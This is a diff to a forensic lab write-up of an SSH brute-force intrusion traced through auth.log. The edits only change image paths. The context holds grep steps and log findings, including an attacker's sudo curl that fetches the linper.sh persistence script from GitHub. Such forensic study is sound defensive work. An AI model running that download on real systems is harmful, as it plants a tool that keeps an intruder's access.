@@ -44,7 +44,7 @@ grep 'Failed password' auth.log | sort | uniq -c | sort -rn | head
 ```
 
 **Finding:**
-![T1](1.jpg)
+![T1](images/1.jpg)
 ```
 A single IP address had hundreds of failed password attempts in a short time,
 clearly standing out from normal traffic — a classic brute-force pattern.
@@ -59,7 +59,7 @@ clearly standing out from normal traffic — a classic brute-force pattern.
 **Question:** The bruteforce attempts were successful and the attacker gained access to an account on the server. What is the username of that account?
 
 **Approach:**
-![T2](2.jpg)
+![T2](images/2.jpg)
 ```bash
 grep 'Accepted password' auth.log | grep '65.2.161.68'
 ```
@@ -89,7 +89,7 @@ Since `utmpdump` was unavailable on the system (removed from newer versions of `
 ```
 
 **Finding:**
-![T3](3.jpg)
+![T3](images/3.jpg)
 ```
 "USER" "2549" "pts/1" "ts/1" "root" "65.2.161.68" "0" "0" "0" "2024/03/06 06:32:45" "387923" "65.2.161.68"
 ```
@@ -109,7 +109,7 @@ grep 'session' auth.log | grep '06:32:44'
 ```
 
 **Finding:**
-![T4](4.jpg)
+![T4](images/4.jpg)
 ```
 Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
 ```
@@ -130,7 +130,7 @@ grep 'sudo' auth.log | grep 'cyberjunkie'
 ```
 
 **Finding:**
-![T5](5.jpg)
+![T5](images/5.jpg)
 ```
 Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
 Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
@@ -172,7 +172,7 @@ grep 'session closed for user root' auth.log
 ```
 
 **Finding:**
-![T6](6.jpg)
+![T6](images/6.jpg)
 ```
 Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
 ```
@@ -194,7 +194,7 @@ grep 'sudo' auth.log | grep 'cyberjunkie'
 ```
 
 **Finding:**
-![T7](7.jpg)
+![T7](images/7.jpg)
 ```
 Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 ```
